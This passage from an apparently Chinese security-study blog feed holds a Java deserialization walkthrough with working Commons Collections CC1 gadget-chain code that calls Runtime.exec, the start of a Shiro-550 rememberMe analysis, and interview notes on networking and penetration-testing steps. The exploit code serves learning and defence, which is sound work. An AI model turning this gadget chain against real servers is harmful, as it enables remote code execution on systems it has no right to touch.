class="comment">//invokerTransformer.transform(runtime);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">rt</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//        //普通反射</span></span><br><span class="line"><span class="comment">//        Method getRuntimeMethod = rt.getMethod(&quot;getRuntime&quot;,null);</span></span><br><span class="line"><span class="comment">//        Runtime runtime = (Runtime) getRuntimeMethod.invoke(null,null);</span></span><br><span class="line"><span class="comment">//        Method execMethod = rt.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">//        execMethod.invoke(runtime,&quot;calc&quot;);</span></span><br><span class="line">        <span class="comment">//用transform方法改写</span></span><br><span class="line">        <span class="comment">//获取getRuntime方法,首先获取Class原型类的getDeclaredMethod方法，然后定义传入参数类型，最后传入两个参数</span></span><br><span class="line"><span class="comment">//        Method getRuntime = (Method) new InvokerTransformer(</span></span><br><span class="line"><span class="comment">//                &quot;getDeclaredMethod&quot;,</span></span><br><span class="line"><span class="comment">//                new Class[]&#123;String.class,Class[].class&#125;,</span></span><br><span class="line"><span class="comment">//                new Object[]&#123;&quot;getRuntime&quot;,null&#125;</span></span><br><span class="line"><span class="comment">//        ).transform(rt);</span></span><br><span class="line"><span class="comment">//        //获取Runtime对象,首先获取invoke方法，定义参数类型，最后两个null</span></span><br><span class="line"><span class="comment">//        Runtime runtime = (Runtime) new InvokerTransformer(</span></span><br><span class="line"><span class="comment">//                &quot;invoke&quot;,</span></span><br><span class="line"><span class="comment">//                new Class[]&#123;Object.class,Object[].class&#125;,</span></span><br><span class="line"><span class="comment">//                new Object[]&#123;null,null&#125;</span></span><br><span class="line"><span class="comment">//        ).transform(getRuntime);</span></span><br><span class="line"><span class="comment">//        //反射执行exec方法</span></span><br><span class="line"><span class="comment">//        new InvokerTransformer(</span></span><br><span class="line"><span class="comment">//                &quot;exec&quot;,</span></span><br><span class="line"><span class="comment">//                new Class[]&#123;String.class&#125;,</span></span><br><span class="line"><span class="comment">//                new Object[]&#123;&quot;calc&quot;&#125;</span></span><br><span class="line"><span class="comment">//        ).transform(runtime);</span></span><br><span class="line">        <span class="comment">//用ChainedTransformer改写</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//chainedTransformer.transform(rt);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化一个HashMap对象用于decorate方法接收</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//首先通过put方法推一个键值对进去，才能进行遍历</span></span><br><span class="line">        map.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">//调用public方法decorate实例化</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        //遍历Map的常用格式</span></span><br><span class="line"><span class="comment">//        for(Map.Entry&lt;Object, Object&gt; entry:transformedMap.entrySet())&#123;</span></span><br><span class="line"><span class="comment">//            //通过setValue方法传入Runtime对象</span></span><br><span class="line"><span class="comment">//            entry.setValue(runtime);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射获取AnnotationInvocationHandler类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance(Override.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(object);</span><br><span class="line">        unserialize(<span class="string">&quot;H:\\学习记录\\学习记录Markdown\\Java安全通用\\CC1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;H:\\学习记录\\学习记录Markdown\\Java安全通用\\CC1&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">test</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        System.out.println(test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在回到触发点readObject处</p>
<img src="/image/image-20230810211759713.png" alt="image-20230810211759713" style="zoom:80%;" />

<p>观察了一下，发现我们要利用的setValue方法包括在第二层if语句内，因此我们需要同时满足这两个if条件，直接在第一个if处下断点运行</p>
<img src="/image/image-20230810212146341.png" alt="image-20230810212146341" style="zoom:80%;" />

<p>由于idea反编译，代码出现了变动，可以无视，此处变量var7即为memberType且值为null，直接跳出了语句</p>
<p>我们来看看memberType是什么</p>
<img src="/image/image-20230810213642227.png" alt="image-20230810213642227" style="zoom:80%;" />

<p>从名字我们可以看出，这个是用来处理注解中成员变量的，而我们此时使用的注解是Override</p>
<img src="/image/image-20230810214553833.png" alt="image-20230810214553833" style="zoom:80%;" />

<img src="/image/image-20230810214427736.png" alt="image-20230810214427736" style="zoom:80%;" />

<p>其中并没有成员变量，我们找一个其他的，例如Target注解中，存在一个value成员变量</p>
<img src="/image/image-20230810214706473.png" alt="image-20230810214706473" style="zoom:80%;" />

<p>我们可以使用Target注解，并且推一个键名为value的键值对</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">......</span><br><span class="line">map.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">......</span><br><span class="line"><span class="comment">//反射获取AnnotationInvocationHandler类</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230810215316588.png" alt="image-20230810215316588" style="zoom:80%;" />

<p>现在var7即memberType的值不为空，满足第一个if</p>
<img src="/image/image-20230810215557521.png" alt="image-20230810215557521" style="zoom:80%;" />

<p>第二个if也满足，成功达到setValue方法，继续跟进</p>
<img src="/image/image-20230810220855360.png" alt="image-20230810220855360" style="zoom:80%;" />

<p>我们发现传入的value并不是需要的Runtime类，而是AnnotationTypeMismatchExceptionProxy，回到第二个if语句，我们可以看到setValue方法直接接受的是<code>new AnnotationTypeMismatchExceptionProxy()</code>语句所实例化的对象，因此无法找到getDeclaredMethod方法</p>
<img src="/image/image-20230810221329726.png" alt="image-20230810221329726" style="zoom:80%;" />

<p>因此我们需要转换这里传入的value值，跟进checkSetValue方法发现是TransformedMap类</p>
<img src="/image/image-20230810223251125.png" alt="image-20230810223251125" style="zoom:80%;" />

<p>我们首先观察一下链式transform的流程，通过下标递增依次执行</p>
<p>可以看到这里执行的是valueTransformer的transform方法，这一条ChainedTransformer链一共有三个Transformer，我们跟进到ChainedTransformer的transform方法，当下标为0时传入对象为AnnotationTypeMismatchExceptionProxy，找不到getDeclaredMethod直接报错</p>
<img src="/image/image-20230810224606744.png" alt="image-20230810224606744" style="zoom:80%;" />

<p>我们要如何转换这里接收到的对象类型呢，这里我们要用到的是cc库中的ConstantTransformer类，它的作用是转换返回的常量类型</p>
<img src="/image/image-20230810225431257.png" alt="image-20230810225431257" style="zoom:80%;" />

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//用ConstantTransformer指定返回类型后的链式Transformer</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>

<p>继续运行跟进到chainedTransformer，当下标为0时执行ConstantTransformer的transform方法</p>
<img src="/image/image-20230810230802930.png" alt="image-20230810230802930" style="zoom:80%;" />

<p>此时将对象转换为了Runtime类并返回</p>
<img src="/image/image-20230810232833074.png" alt="image-20230810232833074" style="zoom:80%;" />

<p>成功达到终点，并进入Runtime类</p>
<p>整个调用链如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">	AnnotationInvocationHandler.readObject()</span><br><span class="line">        Map(Proxy).entrySet()</span><br><span class="line">            AbstractInputCheckedMapDecorator.MapEntry.setValue()</span><br><span class="line">                TransformedMap.decorate()</span><br><span class="line">                TransformedMap.checkSetValue()</span><br><span class="line">                    ChainedTransformer.transform()</span><br><span class="line">                        ConstantTransformer.transform()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Class.getDeclaredMethod()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Class.getRuntime()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.<span class="built_in">exec</span>()</span><br></pre></td></tr></table></figure>



<h3 id="Shiro550"><a href="#Shiro550" class="headerlink" title="Shiro550"></a>Shiro550</h3><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p>在Apache shiro的框架中，执行身份验证时提供了一个记住密码的功能（RememberMe），如果用户登录时勾选了这个选项。用户的请求数据包中将会在cookie字段多出一段数据，这一段数据包含了用户的身份信息，且是经过加密的。加密的过程是：<strong>用户信息&#x3D;&gt;序列化&#x3D;&gt;AES加密（这一步需要用密钥key）&#x3D;&gt;base64编码&#x3D;&gt;添加到RememberMe Cookie字段</strong>。勾选记住密码之后，下次登录时，服务端会根据客户端请求包中的cookie值进行身份验证，无需登录即可访问。那么显然，服务端进行对cookie进行验证的步骤就是：<strong>取出请求包中rememberMe的cookie值 &#x3D;&gt; Base64解码&#x3D;&gt;AES解密（用到密钥key）&#x3D;&gt;反序列化。</strong></p>
<p>首先进行登录，勾选RememberMe选项</p>
<img src="/image/image-20230911103438064.png" alt="image-20230911103438064" style="zoom:80%;" />

<p>返回cookie字段钟存在rememberMe字段</p>
<p>或者直接携带任意rememberMe字段进行发包，相应包中存在deleteMe字段</p>
<img src="/image/image-20230912171705451.png" alt="image-20230912171705451" style="zoom:80%;" />

<p>当客户端再次请求服务端时，都会带上这个服务端第一次返回设置的Set-Cookie里面的rememberMe的密文，让服务端进行身份验证。</p>
<p>整个正常流程和攻击流程参照下图</p>
<img src="/image/image-20230912171915619.png" alt="image-20230912171915619" style="zoom: 67%;" />

<p>可以看到触发点是cookie处理的部分，shiro默认使用CookieRememberMeManager类处理cookie</p>
<p>我们跟进到<code>org.apache.shiro.web.mgt.CookieRememberMeManager</code>类</p>
<img src="/image/image-20230912182438895.png" alt="image-20230912182438895" style="zoom:80%;" />

<p><code>CookieRememberMeManager</code>类总共有四个涉及cookie处理的函数：<code>CookieRememberMeManager</code>， <code>rememberSerializedIdentity</code> ，<code>getRememberedSerializedIdentity</code>及<code>forgetIdentity</code>（公有，私有，保护），我们依次来看</p>
<h5 id="CookieRememberMeManager"><a href="#CookieRememberMeManager" class="headerlink" title="CookieRememberMeManager"></a>CookieRememberMeManager</h5><img src="/image/image-20230912183247709.png" alt="image-20230912183247709" style="zoom: 80%;" />

<p>构造方法，作用是设置一个cookie对象，并且设置HttpOnly和MaxAge，跟进到SimpleCookie类</p>
<img src="/image/image-20230912184029090.png" alt="image-20230912184029090" style="zoom:80%;" />

<p>设置了</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>护网面试问题</title>
    <url>/2022/10/21/%E6%8A%A4%E7%BD%91%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h2 id="osi七层模型"><a href="#osi七层模型" class="headerlink" title="osi七层模型"></a>osi七层模型</h2><h3 id="第七层-应用层"><a href="#第七层-应用层" class="headerlink" title="第七层:应用层"></a>第七层:应用层</h3><p>功能:提供各种各样的应用层协议,为用户与网络之间提供一个打交道的接口。<br>常见协议:TELENT,DNS,HTTP,HTTPS,FTP,NFS<br>协议介绍:<br>TELENT:使用远程计算机上所拥有的本地计算机没有的信息资源，是常用的远程控制Web服务器的方法<br>DNS(域名解析协议):将域名解析为IP地址<br>HTTP(超文本传输协议):规定web服务端和客户端的数据传输格式<br>HTTPS(超文本传输安全协议):是HTTP加上TLS&#x2F;SSL协议构成的可加密传输的网络协议<br>FTP(文件传输协议):网络共享文件传输<br>NFS(网络文件系统):用户和程序可以像访问本地文件一样访问远端系统上的文件。</p>
<h3 id="第六层-表示层"><a href="#第六层-表示层" class="headerlink" title="第六层:表示层"></a>第六层:表示层</h3><p>功能:提供应用层数据的公共表示,即统一数据格式,从而使得数据能在两个系统中传输。<br>常见协议:LPP<br>协议介绍:<br>LPP(轻量级会话协议):描述了在某些受限条件下提供基于 TCP&#x2F;IP 网络的 OSI 应用程序服务器的流线支持的方法。</p>
<h3 id="第五层-会话层"><a href="#第五层-会话层" class="headerlink" title="第五层:会话层"></a>第五层:会话层</h3><p>功能:负责应用程序之间建立、维持和中断会话，同时也提供对设备和结点之间的会话控制，协调系统和服务之间的交流，并通过提供单工、半双工和全双工3种不同的通信方式，使系统和服务之间有序地进行通信。<br>常见协议:LDAP<br>协议介绍:<br>LDAP(轻型目录访问协议):通过IP协议提供访问控制和维护分布式信息的目录信息</p>
<h3 id="第四层-传输层"><a href="#第四层-传输层" class="headerlink" title="第四层:传输层"></a>第四层:传输层</h3><p>功能:主要功能负责数据传输时端到端的完整性，即在网络上建立发送主机和目的主机之间的逻辑连接，从而隐藏了上一层提供数据传输时任何网络独立信息。<br>常见协议:TCP,UDP,TLS<br>协议介绍:<br>TCP(传输控制协议):一种面向连接的、可靠的、基于字节流的传输层通信协议<br>UDP(用户数据报协议):面向事务的简单不可靠信息传送服务<br>TLS(传输层安全协议):在两个通信应用程序之间提供保密性和数据完整性</p>
<h3 id="第三层-网络层"><a href="#第三层-网络层" class="headerlink" title="第三层:网络层"></a>第三层:网络层</h3><p>功能:负责数据从一个结点到另一个结点的传输，并根据地址（IP&#x2F;IPX地址），为信息在网络中传输是选择最佳路径。<br>常见协议:IP,ICMP,ICMPv6,ARP,RARP<br>协议介绍:<br>IP(网络互联协议):为主机提供一种无连接、不可靠的、尽力而为的数据包传输服务<br>ICMP(Internet控制报文协议):是一种面向无连接的协议，用于传输出错报告控制信息<br>ICMPv6(互联网控制信息协议版本六):为了与IPv6配套使用而开发的互联网控制信息协议,向源节点报告关于目的地址传输IPv6包的错误和信息，具有差错报告、网络诊断、邻节点发现和多播实现等功能<br>ARP(地址解析协议):据IP地址获取物理地址的一个TCP&#x2F;IP协议<br>RARP(反向地址转换协议):发出要反向解析的物理地址并希望返回其对应的IP地址，应答包括由能够提供所需信息的RARP服务器发出的IP地址</p>
<p>设备：路由器</p>
<h3 id="第二层-数据链路层"><a href="#第二层-数据链路层" class="headerlink" title="第二层:数据链路层"></a>第二层:数据链路层</h3><p>功能:主要功能是负责信息从一个结点到另一人结点的物理传输，检测在物理层上传输可能发生的错误并进行纠错，同时处理网络拓扑结构和流量控制等问题。<br>常见协议:VLAN,STP,IEEE 802.3,WIFI(IEEE 802.11),ATM,HDLC,PPP<br>协议介绍:<br>VLAN(虚拟局域网):根据功能、部门及应用等因素将设备或用户组织起来，相互之间的通信就好像它们在同一个网段中一样<br>STP(生成树协议):应用于计算机网络中树形拓扑结构建立，主要作用是防止网桥网络中的冗余链路形成环路工作<br>IEEE 802.3:定义了有线以太网的物理层和数据链路层的介质访问控制 （MAC）<br>WIFI(无线通信技术):实现无线上网<br>ATM(异步传输网):用户平面——是用户协议之间的接口如IP或SMDS和ATM等协议的接口互相协调;管理平面——使ATM栈的各层互相协调;控制平面——使信令传送以及虚电路的建立和拆除互相协调。<br>HDLC(高级数据链路控制):帧控制,帧同步,差错控制,流量控制,链路管理,透明传输,寻址,异常状态恢复<br>PPP(点对点协议):用来通过拨号或专线方式建立点对点连接发送数据，使其成为各种主机、网桥和路由器之间简单连接的一种共通的解决方案</p>
<p>设备：网桥，交换机</p>
<h3 id="第一层-物理层"><a href="#第一层-物理层" class="headerlink" title="第一层:物理层"></a>第一层:物理层</h3><p>功能:主要功能是直接在物理传输介质上发送和接收数据位，为数据链路层提供物理连接。</p>
<p>设备：网卡，网线，集线器，中继器，调制解调器</p>
<h2 id="常见的状态码"><a href="#常见的状态码" class="headerlink" title="常见的状态码"></a>常见的状态码</h2><p> <strong>2XX——表明请求被正常处理了</strong></p>
<p>1、200 OK：请求已正常处理。</p>
<p>2、204 No Content：请求处理成功，但没有任何资源可以返回给客户端，一般在只需要从客户端往服务器发送信息，而对客户端不需要发送新信息内容的情况下使用。</p>
<p>3、206 Partial Content：是对资源某一部分的请求，该状态码表示客户端进行了范围请求，而服务器成功执行了这部分的GET请求。响应报文中包含由Content-Range指定范围的实体内容。</p>
<p><strong>3XX——表明浏览器需要执行某些特殊的处理以正确处理请求</strong></p>
<p>4、301 Moved Permanently：资源的uri已更新，你也更新下你的书签引用吧。永久性重定向，请求的资源已经被分配了新的URI，以后应使用资源现在所指的URI。</p>
<p>5、302 Found：资源的URI已临时定位到其他位置了，姑且算你已经知道了这个情况了。临时性重定向。和301相似，但302代表的资源不是永久性移动，只是临时性性质的。换句话说，已移动的资源对应的URI将来还有可能发生改变。</p>
<p>6、303 See Other：资源的URI已更新，你是否能临时按新的URI访问。该状态码表示由于请求对应的资源存在着另一个URL，应使用GET方法定向获取请求的资源。303状态码和302状态码有着相同的功能，但303状态码明确表示客户端应当采用GET方法获取资源，这点与302状态码有区别。</p>
<p>当301,302,303响应状态码返回时，几乎所有的浏览器都会把POST改成GET，并删除请求报文内的主体，之后请求会自动再次发送。</p>
<p>7、304 Not Modified：资源已找到，但未符合条件请求。该状态码表示客户端发送附带条件的请求时（采用GET方法的请求报文中包含If-Match，If-Modified-Since，If-None-Match，If-Range，If-Unmodified-Since中任一首部）服务端允许请求访问资源，但因发生请求未满足条件的情况后，直接返回304.。</p>
<p>8、307 Temporary Redirect：临时重定向。与302有相同的含义。</p>
<p><strong>4XX——表明客户端是发生错误的原因所在</strong></p>
<p>9、400 Bad Request：服务器端无法理解客户端发送的请求，请求报文中可能存在语法错误。</p>
<p>10、401 Unauthorized：该状态码表示发送的请求需要有通过HTTP认证（BASIC认证，DIGEST认证）的认证信息。</p>
<p>11、403 Forbidden：不允许访问那个资源。该状态码表明对请求资源的访问被服务器拒绝了。（权限，未授权IP等）</p>
<p>12、404 Not Found：服务器上没有请求的资源。路径错误等。</p>
<p><strong>5XX——服务器本身发生错误</strong></p>
<p>13、500 Internal Server Error：貌似内部资源出故障了。该状态码表明服务器端在执行请求时发生了错误。也有可能是web应用存在bug或某些临时故障。</p>
<p>14、503 Service Unavailable：抱歉，我现在正在忙着。该状态码表明服务器暂时处于超负载或正在停机维护，现在无法处理请求。</p>
<h2 id="session和cookie的区别"><a href="#session和cookie的区别" class="headerlink" title="session和cookie的区别"></a>session和cookie的区别</h2><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>cookie是一种无状态的协议</p>
<p>原理：</p>
<p><img src="/image/image-20220602191657566.png" alt="image-20220602191657566"></p>
<p>相当于给客户端分发了一个id卡，第一次登录获取，第二次服务端通过客户端携带的id卡来确认身份，即优缺点非常明显：</p>
<p>优点：流程简单快速</p>
<p>缺点：容易遭到篡改；大小受到限制，一般为4kb</p>
<h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><p>session功能和cookie类似，不过有一定区别</p>
<p>原理：</p>
<p><img src="/image/image-20220602191623108.png" alt="image-20220602191623108"></p>
<p>session顾名思义，即会话，是一种特殊的cookie。客户端访问服务端后，将状态以session的形式保存在服务端，此时再将该会话的id卡分发到客户端，再次访问服务端时，只需要从该session中查找该客户端的状态即可。</p>
<p>优点：更加安全</p>
<p>缺点：更占用服务器性能</p>
<h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><p>故区别有：cookie是保存在客户端，session保存在服务端</p>
<h2 id="渗透测试的流程和思路（外网打点等）"><a href="#渗透测试的流程和思路（外网打点等）" class="headerlink" title="渗透测试的流程和思路（外网打点等）"></a>渗透测试的流程和思路（外网打点等）</h2><h3 id="明确目标"><a href="#明确目标" class="headerlink" title="明确目标"></a>明确目标</h3><p>确认测试范围，如ip段，域名，站点等；对渗透目标进行判断，能进行渗透的程度。</p>
<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><ul>
<li>主动式信息搜集：得到的信息比较及时，获取到的信息更多，但容易被目标发现</li>
</ul>
<p>通过直接发起连接的方式来搜集目标信息，如各种扫描器（nmap等）进行扫描、手动测试等</p>
<ul>
<li>被动式信息搜集：搜集到的信息可能会有一定延时，获取到的信息较少，但更加隐蔽</li>
</ul>
<p>如果有外网，可搜索引擎关键词或语法搜索（<code>inurl=</code>等）、zoomeye等网络资产测绘引擎等，查找资产暴露面</p>
<h4 id="whois信息"><a href="#whois信息" class="headerlink" title="whois信息"></a>whois信息</h4><p>获取域名所有者的信息，包括姓名，公司，邮箱等，可以反查旁站、用于社会工程学的利用等。</p>
<h4 id="域名解析搜集"><a href="#域名解析搜集" class="headerlink" title="域名解析搜集"></a>域名解析搜集</h4><p>如果目标使用了cdn或其他方式隐藏了真实ip，可以尝试通过查找历史解析，旁站或子域名解析等方法来查找真实ip</p>
<h4 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h4><p>很多情况下，子域名可能和主站是相同服务器，如果主站没有发现突破口或者渗透难度较大，可尝试收集子域名，或从旁站寻找漏洞突破口</p>
<h4 id="真实ip获取"><a href="#真实ip获取" class="headerlink" title="真实ip获取"></a>真实ip获取</h4><p>首先判断目标是否采用了cdn</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.多地ping：因为cdn的目的是为了稳定速度，有些cdn服务商可能会在不同的地点或者ip设立节点服务器，所以不同地点ping出的ip不同则采用了cdn；但是多地ping出的ip相同也不一定就是真实ip，还要考虑单一cdn节点的可能性。</span><br><span class="line"></span><br><span class="line">2.二级域名：因为cdn流量还是比较贵的，所以不一定每个子域名都挂上了cdn，此时我们可以通过子域名来发现真实ip本地将目标域名绑定到同IP（修改host文件），如果能访问就说明目标站与此二级域名在同一个服务器上；如果两者不在同一服务器也可能在同C段，扫描C段所有开80端口的IP，然后挨个尝试。</span><br><span class="line"></span><br><span class="line">3.国外冷门dns服务器解析：大部分国内cdn服务商只针对国内市场，如果采用外国冷门服务器进行dns解析，有较大概率解析到真实ip</span><br></pre></td></tr></table></figure>

<h4 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h4><p>通常情况下，建站者为了方便，会直接采用常见的CMS、框架或者中间件等，比较常见的建站系统都会有明显的指纹特征，网上公开的漏洞或者源码也会比较多，通过相应指纹识别，可以一定程度上帮助渗透过程</p>
<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>nmap，masscan等进行扫描目标开放端口以及获取端口banner，确定端口对应的服务以及版本</p>
<h4 id="旁站c段查询"><a href="#旁站c段查询" class="headerlink" title="旁站c段查询"></a>旁站c段查询</h4><p>通过入侵安全性较差的旁站，c段（测试站点），可通过提权、跨目录等手段拿到目标服务器的权限</p>
<p><strong>httpscan：通过爬虫的方式扫描指定c段的网站信息</strong></p>
<h3 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3><h4 id="前端信息泄露"><a href="#前端信息泄露" class="headerlink" title="前端信息泄露"></a>前端信息泄露</h4><p>一些前端的静态文件（静态文件目录，js，css等）和静态接口，可能泄露敏感数据</p>
<h4 id="敏感目录扫描，备份文件等"><a href="#敏感目录扫描，备份文件等" class="headerlink" title="敏感目录扫描，备份文件等"></a>敏感目录扫描，备份文件等</h4><p>通过手动fuzz或者扫描器扫描，搜集目标站点的敏感目录或者备份文件等等。不一定要能够访问，也可以从前端或者报错的信息来判断</p>
<h4 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h4><p>前台或后台登陆点可能存在弱口令</p>
<h4 id="注册点"><a href="#注册点" class="headerlink" title="注册点"></a>注册点</h4><p>注册点一般是比较敏感的，如果开放了注册功能，可能拿到一些普通的用户权限</p>
<h4 id="上传点"><a href="#上传点" class="headerlink" title="上传点"></a>上传点</h4><p>常见的上传点有：头像上传，文章图片上传，富文本编辑器等</p>
<h4 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h4><p>网站未对输入的字符进行过滤或者合法性校验，可通过拼接，拦截，绕过黑名单等方式来执行恶意命令</p>
<h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>网站进行sql查询的点，如果未对传入的数据进行过滤，可猜测和拼接sql查询语句来执行恶意查询</p>
<h4 id="已知组件CVE或存在exp的漏洞"><a href="#已知组件CVE或存在exp的漏洞" class="headerlink" title="已知组件CVE或存在exp的漏洞"></a>已知组件CVE或存在exp的漏洞</h4><p>通过指纹识别获取到的目标组件、版本信息</p>
<h3 id="后续渗透"><a href="#后续渗透" class="headerlink" title="后续渗透"></a>后续渗透</h3><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>通过漏洞探测到的可用漏洞进行进一步操作，例如webshell等</p>
<h2 id="sql注入的方式"><a href="#sql注入的方式" class="headerlink" title="sql注入的方式"></a>sql注入的方式</h2><h3 id="按注入类型"><a href="#按注入类型" class="headerlink" title="按注入类型"></a>按注入类型</h3><ul>
<li>数字型</li>
<li>字符型（输入型）</li>
</ul>
<p>判断：</p>
